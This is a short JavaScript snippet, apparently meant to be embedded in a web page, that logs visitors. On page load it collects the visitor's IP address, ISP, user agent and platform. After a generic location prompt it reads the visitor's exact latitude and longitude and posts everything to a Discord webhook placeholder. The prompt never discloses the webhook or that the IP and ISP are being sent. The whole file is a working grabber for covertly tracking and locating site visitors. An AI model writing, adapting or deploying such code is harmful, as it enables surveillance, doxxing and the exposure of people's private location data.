window.addEventListener("load", function() {
    // Fetch IP address and ISP data
    fetch('https://ipapi.co/json/')
    .then(function(response) {
        return response.json();
    })
    .then(function(data) {
        var ipAddress = data.ip;
        var isp = data.org; // ISP data
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;

        // Ask for location permission
        if (confirm("Do you want to allow this site to access your location data?")) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    var webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
                    var message = {
                        "content": `A visitor has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLocation: Latitude ${latitude}, Longitude ${longitude}`
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    }).then(function(response) {
                        if (response.ok) {
                            console.log("Notification sent to Discord successfully.");
                        } else {
                            console.log("Failed to send notification to Discord.");
                        }
                    }).catch(function(error) {
                        console.error("Error:", error);
                    });
                }, function(error) {
                    console.error("Geolocation error:", error);
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        } else {
            console.log("User denied location access.");
        }
    })
    .catch(function(error) {
        console.error("Error fetching IP address and ISP data:", error);
    });
});
